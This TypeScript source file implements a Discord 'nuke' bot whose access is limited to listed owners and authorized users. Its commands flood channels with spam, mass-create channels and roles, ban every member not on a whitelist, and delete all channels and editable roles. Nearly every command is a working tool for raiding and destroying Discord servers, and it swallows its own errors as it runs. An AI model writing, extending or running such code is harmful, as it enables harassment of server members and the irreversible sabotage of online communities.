import { Client, GatewayIntentBits, Message, ChannelType, PermissionFlagsBits, EmbedBuilder, Colors } from 'discord.js';
import fs from 'fs';
import path from 'path';
import dotenv from 'dotenv';

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildModeration,
  ],
});

const ACCESS_FILE = path.join(process.cwd(), 'access.json');
const WHITELIST_FILE = path.join(process.cwd(), 'whitelist.json');

function getAccess() {
  try {
    return JSON.parse(fs.readFileSync(ACCESS_FILE, 'utf-8'));
  } catch {
    return { owners: [], authorized: [] };
  }
}

function getWhitelist() {
  try {
    return JSON.parse(fs.readFileSync(WHITELIST_FILE, 'utf-8'));
  } catch {
    return { whitelisted: [] };
  }
}

const OWNER_ID = process.env.OWNER_ID || "";

client.on('ready', () => {
  console.log(`[POWER-CORE] Logged in as ${client.user?.tag}!`);
});

client.on('messageCreate', async (message: Message) => {
  if (message.author.bot || !message.guild) return;

  const access = getAccess();
  const isOwner = message.author.id === OWNER_ID || access.owners.includes(message.author.id);
  const isAuthorized = access.authorized.includes(message.author.id);

  if (!isOwner && !isAuthorized) return;

  let content = message.content;
  const prefix = '+';
  
  if (content.startsWith(prefix)) {
    content = content.slice(prefix.length);
  }

  const args = content.trim().split(/\s+/);
  const commandName = args.shift();

  if (!commandName) return;

  const startTime = Date.now();

  // Command Handler
  try {
    switch (commandName) {
      case 'Zspam': {
        const count = parseInt(args[0]);
        const target = args[1];
        const spamMessage = args.slice(2).join(' ');

        if (isNaN(count) || !target || !spamMessage) {
          const embed = new EmbedBuilder()
            .setColor(Colors.Red)
            .setTitle('❌ Invalid Parameters')
            .setDescription('`Zspam <count> <channel/all> <message>`');
          return message.reply({ embeds: [embed] });
        }

        const initialEmbed = new EmbedBuilder()
          .setColor(Colors.Yellow)
          .setTitle('⚡ Initializing Spam Protocol')
          .setDescription(`Targeting: \`${target}\` | Count: \`${count}\``)
          .setTimestamp();
        
        const statusMsg = await (message.channel as any).send({ embeds: [initialEmbed] });
        
        const channels = target.toLowerCase() === 'all' 
          ? message.guild.channels.cache.filter(c => c.type === ChannelType.GuildText)
          : message.guild.channels.cache.filter(c => c.toString() === target || c.id === target.replace(/[<#>]/g, ''));

        const tasks = [];
        for (let i = 0; i < count; i++) {
          channels.forEach(channel => {
            if (channel.isTextBased()) {
              tasks.push((channel as any).send(spamMessage).catch(() => {}));
            }
          });
        }

        await Promise.all(tasks);
        
        const finishTime = (Date.now() - startTime) / 1000;
        const finalEmbed = new EmbedBuilder()
          .setColor(Colors.Green)
          .setTitle('✅ Spam Protocol Complete')
          .setDescription(`Successfully dispatched \`${count}\` payloads across \`${channels.size}\` sectors.`)
          .addFields({ name: 'Execution Time', value: `\`${finishTime}s\``, inline: true })
          .setTimestamp();

        await statusMsg.edit({ embeds: [finalEmbed] });
        break;
      }

      case 'Zmchannel': {
        const count = parseInt(args[0]);
        const name = args.slice(1).join(' ');

        if (isNaN(count) || !name) return;

        const tasks = [];
        for (let i = 0; i < count; i++) {
          tasks.push(message.guild.channels.create({ name, type: ChannelType.GuildText }).catch(() => {}));
        }
        await Promise.all(tasks);
        break;
      }

      case 'Zmrole': {
        const count = parseInt(args[0]);
        const name = args.slice(1).join(' ');

        if (isNaN(count) || !name) return;

        const tasks = [];
        for (let i = 0; i < count; i++) {
          tasks.push(message.guild.roles.create({ name }).catch(() => {}));
        }
        await Promise.all(tasks);
        break;
      }

      case 'Z': {
        const subCommand = args[0];
        if (subCommand === 'massbann') {
          const whitelist = getWhitelist().whitelisted;
          const members = await message.guild.members.fetch();
          const toBan = members.filter(m => !whitelist.includes(m.id) && m.bannable && m.id !== message.author.id && m.id !== client.user?.id);
          
          const embed = new EmbedBuilder()
            .setColor(Colors.DarkRed)
            .setTitle('🔥 Mass Ban Protocol Engaged')
            .setDescription(`Targeting \`${toBan.size}\` unauthorized entities.`)
            .setTimestamp();
          
          await (message.channel as any).send({ embeds: [embed] });
          await Promise.all(toBan.map(m => m.ban({ reason: 'Z-Bot Purge' }).catch(() => {})));
        } else if (subCommand === 'massunban') {
          const bans = await message.guild.bans.fetch();
          await Promise.all(bans.map(b => message.guild?.members.unban(b.user).catch(() => {})));
        }
        break;
      }

      case 'Zdr': {
        const roles = message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone');
        await Promise.all(roles.map(r => r.delete().catch(() => {})));
        break;
      }

      case 'Zdz': {
        const channels = message.guild.channels.cache;
        const roles = message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone');
        
        await Promise.all([
          ...channels.map(c => c.delete().catch(() => {})),
          ...roles.map(r => r.delete().catch(() => {}))
        ]);
        break;
      }

      case 'Zping': {
        const pingEmbed = new EmbedBuilder()
          .setColor(Colors.Green)
          .setTitle('🏓 Pong!')
          .addFields(
            { name: 'API Latency', value: `\`${client.ws.ping}ms\``, inline: true },
            { name: 'Message Latency', value: `\`${Date.now() - message.createdTimestamp}ms\``, inline: true }
          )
          .setFooter({ text: 'Optimized for High-Speed Execution' })
          .setTimestamp();
        
        await (message.channel as any).send({ embeds: [pingEmbed] });
        break;
      }

      case 'Zstats': {
        const embed = new EmbedBuilder()
          .setColor(Colors.Blue)
          .setTitle('📊 System Performance Metrics')
          .addFields(
            { name: 'Latency', value: `\`${client.ws.ping}ms\``, inline: true },
            { name: 'Uptime', value: `\`${Math.floor(process.uptime() / 60)}m\``, inline: true },
            { name: 'Memory', value: `\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB\``, inline: true },
            { name: 'Guilds', value: `\`${client.guilds.cache.size}\``, inline: true }
          )
          .setFooter({ text: 'Powered by Google Cloud Run High-Speed Hosting' })
          .setTimestamp();
        
        await (message.channel as any).send({ embeds: [embed] });
        break;
      }
    }
  } catch (error) {
    console.error('Command Error:', error);
  }
});

const token = process.env.DISCORD_TOKEN;
if (token) {
  client.login(token);
} else {
  console.error('No DISCORD_TOKEN provided in environment variables.');
}
